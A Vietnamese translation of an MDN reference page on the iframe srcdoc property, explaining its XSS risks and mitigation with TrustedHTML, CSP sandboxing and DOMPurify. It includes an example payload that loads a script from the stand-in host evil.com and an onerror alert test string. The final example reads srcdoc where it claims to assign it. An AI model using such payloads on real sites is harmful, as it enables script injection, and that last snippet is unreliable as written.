---
title: "HTMLIFrameElement: thuộc tính srcdoc"
short-title: srcdoc
slug: Web/API/HTMLIFrameElement/srcdoc
page-type: web-api-instance-property
browser-compat: api.HTMLIFrameElement.srcdoc
---

{{APIRef("HTML DOM")}}

> [!WARNING]
> Thuộc tính này phân tích cú pháp đầu vào của nó dưới dạng HTML, ghi kết quả vào DOM của khung.
> Các API như thế này được gọi là [injection sinks](/en-US/docs/Web/API/Trusted_Types_API#concepts_and_usage), và có khả năng là vectơ tấn công [cross-site scripting (XSS)](/en-US/docs/Web/Security/Attacks/XSS), nếu đầu vào ban đầu đến từ kẻ tấn công.
>
> Bạn có thể giảm thiểu rủi ro này bằng cách luôn gán các đối tượng `TrustedHTML` thay vì chuỗi và [enforcing trusted types](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
> Xem [Xem xét bảo mật](#security_considerations) để biết thêm thông tin.

Thuộc tính **`srcdoc`** của giao diện {{domxref("HTMLIFrameElement")}} lấy hoặc đặt markup HTML nội tuyến của tài liệu khung.

Nó phản ánh thuộc tính [`srcdoc`](/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) của {{htmlelement("iframe")}}.

## Giá trị

Lấy thuộc tính trả về một chuỗi chứa phần nối tiếp HTML của tài liệu khung.
Giá trị là `undefined` nếu giá trị chưa được đặt.

Đặt thuộc tính chấp nhận một đối tượng {{domxref("TrustedHTML")}} hoặc một chuỗi.
Nó phân tích cú pháp đầu vào này như một tài liệu HTML và thay thế nội dung của khung bằng kết quả.

### Ngoại lệ

- `TypeError`
  - : Ném ra nếu thuộc tính được đặt thành một chuỗi khi [Trusted Types](/en-US/docs/Web/API/Trusted_Types_API) được [thực thi bởi CSP](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) và không có chính sách mặc định nào được định nghĩa.

## Mô tả

Thuộc tính **`srcdoc`** phản ánh nội dung của thuộc tính [`srcdoc`](/en-US/docs/Web/HTML/Reference/Elements/iframe#srcdoc) của phần tử `<iframe>`, và có thể được sử dụng để đặt hoặc lấy tài liệu HTML thuộc về {{htmlelement("iframe")}}.

Khi đặt thuộc tính, đầu vào nên định nghĩa một tài liệu HTML hợp lệ, bao gồm {{glossary("doctype","directive doctype")}}, {{htmlelement("html")}}, {{htmlelement("body")}}, và các thẻ khác.
Tuy nhiên, lưu ý rằng các trình duyệt thường dung thứ markup không hợp lệ, và hầu hết sẽ cố gắng kết xuất đầu vào chỉ chứa nội dung body.

Bất kỳ markup nào được hỗ trợ bởi trình duyệt sẽ được phân tích cú pháp/nối tiếp, bao gồm {{glossary("shadow tree", "Shadow roots")}}.

Lưu ý rằng nếu thuộc tính này được đặt, nó sẽ ghi đè lên bất kỳ giá trị nào được đặt trong thuộc tính {{domxref("HTMLIFrameElement.src", "src")}}.

### Xem xét bảo mật

Thuộc tính `srcdoc` cho phép absolutely bất kỳ markup HTML nào chạy trong khung theo mặc định.
Nếu khung không được sandbox bằng chỉ thị [`sandbox`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) của Chính sách bảo mật nội dung (CSP) (hoặc được sandbox nhưng bao gồm giá trị [`allow-same-origin`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin)) thì nó sẽ có cùng nguồn gốc với trang cha.
Điều này có nghĩa là khung sẽ có quyền truy cập hoàn toàn vào DOM và tài nguyên của trang cha, và ngược lại.

Đây là một vectơ đáng kể cho các cuộc tấn công [cross-site scripting (XSS)](/en-US/docs/Web/Security/Attacks/XSS) nếu các chuỗi không an toàn tiềm ẩn do người dùng cung cấp được chèn vào khung mà không được làm sạch trước đó.
Xem xét đoạn mã sau đây nơi một chuỗi HTML từ người dùng có thể được chuyển vào khung sau đó được thêm vào tài liệu.

```js
const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
const iframe = document.createElement("iframe");
iframe.srcdoc = untrustedStringFromUser;
document.body.appendChild(iframe);
```

Nếu khung không cần truy cập vào tài liệu cha của bạn, bạn có thể giảm thiểu rủi ro bằng cách sử dụng sandbox CSP mà không có giá trị `allow-same-origin`.
Khung sau đó sẽ được xem như một tài nguyên khác nguồn gốc, và các cuộc tấn công sẽ bị hạn chế đáng kể.
Bạn cũng có thể sử dụng CSP tổng quát hơn để hạn chế các vị trí mà từ đó script và các tài nguyên khác được phép lấy.

Bạn có thể giảm thiểu thêm rủi ro bằng cách luôn gán các đối tượng {{domxref("TrustedHTML")}} thay vì chuỗi, và [enforcing trusted type](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) bằng cách sử dụng chỉ thị CSP [`require-trusted-types-for`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for).
Điều này đảm bảo rằng đầu vào được chuyển qua một hàm biến đổi, hàm này có cơ hội [làm sạch](/en-US/docs/Web/Security/Attacks/XSS#sanitization) đầu vào để loại bỏ markup nguy hiểm tiềm ẩn trước khi nó được chèn vào.

## Ví dụ

### Đọc HTML từ một iframe

Đọc `srcdoc` khiến user agent tuần tự hóa tài liệu của iframe.

Với HTML sau:

```html
<iframe
  id="example"
  srcdoc="<!doctype html><body><p>Hello World!</p></body>"></iframe>
```

Bạn có thể lấy và ghi lại markup như sau:

```js
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
console.log(frameDoc); // "<!doctype html><body><p>Hello World!</p></body>"
```

### Thay thế nguồn nội tuyến của khung

Trong ví dụ này, chúng ta sẽ thay thế tài liệu của khung bằng cách gán HTML cho thuộc tính `srcdoc` của nó.
Để giảm thiểu rủi ro XSS, trước tiên chúng ta sẽ tạo một đối tượng `TrustedHTML` từ chuỗi chứa HTML, và sau đó gán đối tượng đó cho `srcdoc`.

Trusted types chưa được hỗ trợ trên tất cả các trình duyệt, vì vậy trước tiên chúng ta định nghĩa [trusted types tinyfill](/en-US/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill).
Điều này hoạt động như một sự thay thế minh bạch cho JavaScript API Trusted Types:

```js
if (typeof trustedTypes === "undefined")
  trustedTypes = { createPolicy: (n, rules) => rules };
```

Tiếp theo, chúng ta tạo một {{domxref("TrustedTypePolicy")}} định nghĩa một {{domxref("TrustedTypePolicy/createHTML", "createHTML()")}} để biến đổi một chuỗi đầu vào thành các thể hiện {{domxref("TrustedHTML")}}.
Thông thường, các triển khai của `createHTML()` sử dụng một thư viện như [DOMPurify](https://github.com/cure53/DOMPurify) để làm sạch đầu vào, như dưới đây:

```js
const policy = trustedTypes.createPolicy("my-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
```

Sau đó, chúng ta sử dụng đối tượng `policy` này để tạo một đối tượng `TrustedHTML` từ chuỗi đầu vào không an toàn tiềm ẩn, và gán kết quả cho phần tử:

```js
// Chuỗi không an toàn tiềm ẩn
const untrustedString =
  "<!doctype html><body><p>I might be XSS</p><img src='x' onerror='alert(1)'></body>";

// Tạo một thể hiện TrustedHTML bằng policy
const trustedHTML = policy.createHTML(untrustedString);

// Chèn TrustedHTML (chứa một chuỗi đáng tin cậy)
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
```

> [!WARNING]
> Mặc dù bạn có thể trực tiếp gán một chuỗi cho `srcdoc`, đây là một [rủi ro bảo mật](#security_considerations) nếu chuỗi được chèn có thể chứa nội dung độc hại tiềm ẩn.
> Bạn nên sử dụng `TrustedHTML` để đảm bảo nội dung được làm sạch trước khi chèn, và bạn nên đặt tiêu đề CSP để [enforce trusted types](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).

## Đặc tả kỹ thuật

{{Specifications}}

## Tương thích trình duyệt

{{Compat}}
